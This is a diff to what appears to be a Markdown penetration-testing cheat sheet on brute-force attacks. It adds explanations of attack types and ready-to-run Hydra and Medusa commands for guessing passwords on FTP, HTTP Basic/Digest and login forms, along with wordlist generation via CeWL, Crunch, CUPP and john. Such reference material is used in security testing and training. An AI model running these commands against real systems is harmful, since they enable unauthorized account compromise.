@@ -18,6 +18,22 @@ checking all possible keys
 until the correct key is found.
 [^brute-force-wiki]
 
+There are several
+types of brute force attacks.
+[^testing-bf-owasp]
+
+- Dictionary Attack
+
+    Dictionary-based attacks consist of systematically test usernames and passwords from a dictionary file.
+
+- Search Attacks
+
+    Search attacks consist of testing possible combinations of a given character set with a given length range.
+
+- Rule-based Search Attacks
+
+    Rule-based attack consist of testing possible combinations based on rules which a particular system is based on.
+
 
 ## Default Credentials
 
@@ -41,7 +57,7 @@ also include default passwords lists.
 
 ## Wordlist Generation
 
-### CeWL [^cewl]
+#### CeWL [^cewl]
 ```sh
 cewl {{< param "war.rdomain" >}} -m 3 -w wordlist.txt
 ```
@@ -50,21 +66,21 @@ cewl {{< param "war.rdomain" >}} -m 3 -w wordlist.txt
 - `-w <file>`: Write the output to `<file>`.
 {{</details>}}
 
-### Crunch [^crunch]
+#### Crunch [^crunch]
 
-#### Simple Wordlist
+Simple wordlist.
 
 ```sh
 crunch 6 12 abcdefghijk1234567890\@\! -o wordlist.txt
 ```
 
-#### String Permutation
+String permutation.
 
 ```sh
 crunch 1 1 -p target pass 2019 -o wordlist.txt
 ```
 
-#### Patterns
+Patterns.
 
 ```sh
 crunch 9 9 0123456789 -t @target@@ -o wordlist.txt
@@ -86,7 +102,7 @@ crunch 9 9 0123456789 -t @target@@ -o wordlist.txt
 
 ## Password Profiling
 
-### CUPP [^cupp]
+#### CUPP [^cupp]
 ```sh
 cupp -i
 ```
@@ -96,7 +112,7 @@ cupp -i
 
 ## Word Mangling
 
-### john [^john]
+#### john [^john]
 ```sh
 john --wordlist=wordlist.txt --rules --stdout
 ```
@@ -117,15 +133,9 @@ See: [KoreLogic's Word Mangling Rule](https://gist.github.com/maxrodrigo/b9ec4e4
 
 ### FTP
 
+See [Combo (Colon Separated) Lists](#combo-colon-separated-lists).
+
 #### Hydra [^hydra]
-
-Using a colon-separated `user:pass` list.
-
-```sh
-hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f {{< param "war.rhost" >}} ftp
-```
-
-Using login user and passwords list.
 
 ```sh
 hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt.gz -f {{< param "war.rhost" >}} ftp
@@ -133,9 +143,66 @@ hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt.gz -f {{< param "war.rhost" 
 
 {{<details "Parameters">}}
 - `-v`: verbose mode.
-- `-C <user:pass file>`: colon-separated "login:pass" format.
 - `-l <user>`: login with `user` name.
+- `-P <passwords file>`: login with passwords from file.
+- `-f`: exit after the first found user/password pair.
+{{</details>}}
+
+#### Medusa [^medusa]
+
+```sh
+medusa -u ftp -P /usr/share/wordlists/rockyou.txt -h {{< param "war.rhost" >}} -M ftp
+```
+
+{{<details "Parameters">}}
+- `-u <user>`: login with `user` name.
 - `-P <passwords file>`: login with password from file.
+- `-h`: target hostname or IP address.
+- `-M`: module to execute.
+{{</details>}}
+
+## Web Applications
+
+### HTTP Basic Auth
+
+```sh
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} http-head /admin/
+```
+
+### HTTP Digest Auth
+
+```sh
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} http-get /admin/
+```
+
+### HTML Form Based Auth
+
+```sh
+hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
+```
+
+{{<details "Parameters">}}
+- `-l <user>`: login with `user` name.
+- `-L <users-file>`: login with users from file.
+- `-P <passwords file>`: login with passwords from file.
+- `http-head | http-get | http-post-form`: service to attack.
+{{</details>}}
+
+## Miscellaneous
+
+### Combo (Colon Separated) Lists
+
+#### Hydra [^hydra]
+
+Use a colon separated `login:pass` format,
+instead of `-L`/`-P` options.
+
+```sh
+hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f {{< param "war.rhost" >}} ftp
+```
+{{<details "Parameters">}}
+- `-v`: verbose mode.
+- `-C <user:pass file>`: colon-separated "login:pass" format.
 - `-f`: exit after the first found user/password pair.
 {{</details>}}
 
@@ -151,13 +218,7 @@ or as a list in a file.
 
 ```sh
 sed s/^/:/ /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt > /tmp/cplist.txt
-medusa -C /tmp/cplist.txt -h {{< param "war.rhost" >}} -M ft
-```
-
-Using login user and passwords list.
-
-```sh
-medusa -u ftp -P /usr/share/wordlists/rockyou.txt -h {{< param "war.rhost" >}} -M ftp
+medusa -C /tmp/cplist.txt -h {{< param "war.rhost" >}} -M ftp
 ```
 
 {{<details "Parameters">}}
@@ -167,6 +228,24 @@ medusa -u ftp -P /usr/share/wordlists/rockyou.txt -h {{< param "war.rhost" >}} -
 - `-M`: module to execute.
 {{</details>}}
 
+### HTTP Authenticated Attack
+
+Append the `Cookie` header
+with the session id
+to the options string,
+e.g.,
+`:H=Cookie\: security=low; PHPSESSID=if0kg4ss785kmov8bqlbusva3v`.
+[^hydra]
+
+```sh
+hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
+```
+
+## Further Reading
+
+- [Making a Faster Cryptanalytic Time-Memory Trade-Off](https://lasecwww.epfl.ch/pub/lasec/doc/Oech03.pdf)
+
+
 [^brute-force-wiki]: Contributors to Wikimedia projects. “Brute-Force Search - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 13 Oct. 2002, https://en.wikipedia.org/wiki/Brute-force_search.
 [^cewl]: digininja. “GitHub - Digininja/CeWL: CeWL Is a Custom Word List Generator.” GitHub, https://github.com/digininja/CeWL/.
 [^cupp]: Mebus. “GitHub - Mebus/Cupp: Common User Passwords Profiler (CUPP).” GitHub, https://github.com/Mebus/cupp.
@@ -174,3 +253,4 @@ medusa -u ftp -P /usr/share/wordlists/rockyou.txt -h {{< param "war.rhost" >}} -
 [^john]: magnumripper. “JohnTheRipper.” GitHub, https://github.com/magnumripper/JohnTheRipper.
 [^hydra]: Heuse, Marc. “GitHub - Vanhauser-Thc/Thc-Hydra: Hydra.” GitHub, https://github.com/vanhauser-thc/thc-hydra. Accessed 12 May 2020.
 [^medusa]: “Foofus Networking Services - Medusa.” Foofus.Net | Foofus.Net Advanced Security Services Forum, http://foofus.net/goons/jmk/medusa/medusa.html.
+[^testing-bf-owasp]: “Testing for Brute Force (OWASP-AT-004).” OWASP, https://wiki.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004).
